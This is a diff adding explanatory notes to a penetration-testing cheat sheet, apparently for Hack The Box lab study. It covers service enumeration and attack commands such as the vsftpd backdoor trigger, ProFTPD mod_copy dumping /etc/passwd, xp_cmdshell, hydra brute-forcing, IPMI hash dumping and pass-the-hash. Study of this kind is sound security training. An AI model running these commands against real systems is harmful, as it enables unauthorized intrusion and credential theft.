@@ -60,6 +60,7 @@ echo -e "USER user:)\nPASS x" | nc TARGET 21       # then: nc TARGET 6200
 SITE CPFR /etc/passwd
 SITE CPTO /var/www/html/passwd.txt
 ```
+> Always try anonymous login first on every FTP port variant (21, 2121, 990, 30021). The `for` loop checks all at once. The vsftpd 2.3.4 backdoor opens a shell on port 6200 when you send `USER` ending with `:)`. ProFTPD mod_copy lets you copy files within the server — use it to drop `/etc/passwd` into the webroot.
 
 ### SMB (139, 445)
 ```bash
@@ -76,6 +77,7 @@ rpcclient -U "" -N TARGET
   > queryuser <RID>
   > getdompwinfo
 ```
+> Try null session (`-u '' -p ''`) first, then `guest` with blank password — Windows Server 2019 often allows guest by default. `smbclient -c 'prompt OFF; recurse ON; mget *'` downloads everything from a share recursively. `rpcclient` lets you enumerate users and groups over RPC after getting access.
 
 ### NFS (111, 2049)
 ```bash
@@ -85,6 +87,7 @@ ls -lan /mnt/nfs                   # note UIDs — sudo -u <uid> bash to read
 
 # Common path: /home/user/.ssh/id_rsa
 ```
+> `showmount -e` lists all exported Network File System (NFS) shares on the target. After mounting, use `ls -lan` (not `ls -la`) to see raw UIDs — if a file is owned by UID 1001, create a local user with that UID to read it.
 
 ### DNS (53)
 ```bash
@@ -98,6 +101,7 @@ dnsenum DOMAIN
 # Subdomain brute
 gobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30
 ```
+> `dig AXFR` attempts a DNS zone transfer — if the server is misconfigured it returns every hostname and IP in the domain. Always try it. `gobuster dns` brute-forces subdomain names. Replace `TARGET` with the DNS server IP and `DOMAIN` with the target domain (e.g., `inlanefreight.com`).
 
 ### SMTP (25, 465, 587)
 ```bash
@@ -112,6 +116,7 @@ smtp-user-enum -M RCPT -U names.txt -t TARGET -D DOMAIN     # most reliable
 # Manual
 swaks --to test@DOMAIN --from a@b.c --server TARGET
 ```
+> Simple Mail Transfer Protocol (SMTP) user enumeration works via three commands: VRFY (verify user), EXPN (expand alias), and RCPT TO (send-to check). Try all three — servers enable different subsets. `swaks` sends test emails and is useful for confirming open relay or testing mail delivery.
 
 ### IMAP / POP3 (110, 143, 993, 995)
 ```bash
@@ -122,6 +127,7 @@ openssl s_client -connect TARGET:995 -crlf -quiet
 # Hydra (Dovecot has no default lockout)
 hydra -L users.txt -P pws.txt pop3://TARGET
 ```
+> Post Office Protocol 3 (POP3) port 110 and Internet Message Access Protocol (IMAP) port 143 are email retrieval services. `openssl s_client` connects to encrypted port 995 (POP3S). If you have credentials, always read emails — they often contain SSH keys, passwords, or internal info.
 > POP3 `+OK` to USER means **no user enumeration** — auth is the only oracle.
 
 ### SNMP (UDP 161) — NIXHARD KEY
@@ -140,6 +146,7 @@ snmpwalk -v2c -c <STR> TARGET 1.3.6.1.2.1.6.13.1.3           # TCP local ports
 
 # Common community strings: public, private, manager, backup, write, internal
 ```
+> Simple Network Management Protocol (SNMP) runs on UDP port 161 — you must use a UDP VPN to see it through HTB. `onesixtyone` brute-forces the community string (a shared password). Once you have it, `snmpwalk` dumps the Management Information Base (MIB) tree. The process args OID (`.25.4.2.1.5`) exposes plaintext command-line arguments — where scheduled jobs hide passwords.
 
 ### MSSQL (1433)
 ```bash
@@ -151,6 +158,7 @@ EXEC sp_configure 'show advanced options',1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
+> Microsoft SQL Server (MSSQL) runs on port 1433. `-windows-auth` uses Windows domain credentials instead of SQL logins. If you have `sysadmin` rights, enable `xp_cmdshell` to run OS commands directly from SQL. Replace `USER@TARGET` with your credentials and target IP.
 
 ### MySQL (3306)
 ```bash
@@ -160,6 +168,7 @@ nmap --script "mysql-info,mysql-empty-password,mysql-databases,mysql-users,mysql
 # Once in:
 SHOW DATABASES; USE x; SHOW TABLES; SELECT * FROM users;
 ```
+> Always try `root` with a blank password first — many default MySQL installs have no root password. Once connected, `SHOW DATABASES` lists all databases, then `USE` selects one and `SHOW TABLES` lists its tables. Look for a `users` table immediately.
 
 ### Oracle TNS (1521)
 ```bash
@@ -170,6 +179,7 @@ odat passwordguesser -s TARGET -p 1521 -d <SID> --accounts-file accounts.txt
 sqlplus user/pass@TARGET:1521/<SID>
 # Common SIDs: XE, ORCL, ORACLE, PROD, DEV, TEST
 ```
+> Oracle Transparent Network Substrate (TNS) requires a System ID (SID) before you can connect. `odat sidguesser` brute-forces the SID, then `odat passwordguesser` brute-forces credentials for that SID. `sqlplus` connects interactively. Try common SIDs (XE, ORCL, ORACLE) before bruting.
 
 ### IPMI (UDP 623)
 ```bash
@@ -178,6 +188,7 @@ msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS TARGET; ru
 msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS TARGET; run; exit"
 # IPMI 2.0 RAKP HMAC-SHA1 hash → hashcat -m 7300
 ```
+> Intelligent Platform Management Interface (IPMI) runs on UDP port 623. The `ipmi_dumphashes` Metasploit module exploits an IPMI 2.0 flaw that leaks HMAC-SHA1 password hashes without authentication. Crack them with `hashcat -m 7300`. Replace `TARGET` with the target IP.
 
 ### Linux Remote Mgmt (SSH=22, R-services=512/513/514, Telnet=23)
 ```bash
@@ -186,6 +197,7 @@ hydra -L users.txt -P pws.txt rsh://TARGET               # rlogin trust files
 ssh-audit TARGET                                         # crypto posture
 ssh -Q cipher | head                                     # local-supported
 ```
+> Grab the Telnet banner with `nc` to identify the OS and version. `ssh-audit` checks the SSH server for weak ciphers and key exchange algorithms. The R-services (rsh/rlogin/rexec on ports 512-514) trust `.rhosts` files — brute them if you see those ports open.
 
 ### Windows Remote Mgmt (RDP=3389, WinRM=5985/5986, RPC=135)
 ```bash
@@ -195,6 +207,7 @@ nxc winrm TARGET -u U -p P
 evil-winrm -i TARGET -u U -p P
 evil-winrm -i TARGET -u U -H NTHASH                      # PtH
 ```
+> Remote Desktop Protocol (RDP) runs on port 3389. Windows Remote Management (WinRM) runs on 5985 (HTTP) and 5986 (HTTPS). `evil-winrm` gives a PowerShell shell over WinRM. The `-H NTHASH` flag lets you authenticate with a password hash instead of a plaintext password (Pass-the-Hash).
 
 ---
 
@@ -226,6 +239,7 @@ openssl s_client -connect TARGET:443 -servername TARGET
 curl -sI http://TARGET
 telnet TARGET PORT
 ```
+> Use these when Nmap reports "tcpwrapped" and can't identify the service. `nc` grabs the raw banner. The `echo` pipe sends an HTTP request manually to reveal the web server. `openssl s_client` shows the TLS certificate and server response. `curl -sI` shows HTTP response headers without downloading the body.
 
 ---
 
